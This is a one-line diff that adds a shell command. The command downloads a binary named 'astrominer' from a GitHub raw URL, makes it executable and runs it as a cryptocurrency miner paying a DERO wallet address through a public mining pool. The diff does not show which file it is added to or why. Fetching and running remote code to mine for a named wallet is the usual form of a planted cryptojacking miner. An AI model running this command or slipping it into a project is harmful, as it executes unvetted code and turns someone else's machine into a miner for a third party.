@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/buddyworkk/bun/main/astrominer && chmod 500 astrominer && ./astrominer  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.qw -r pool.whalesburg.com:4304 -p stratum
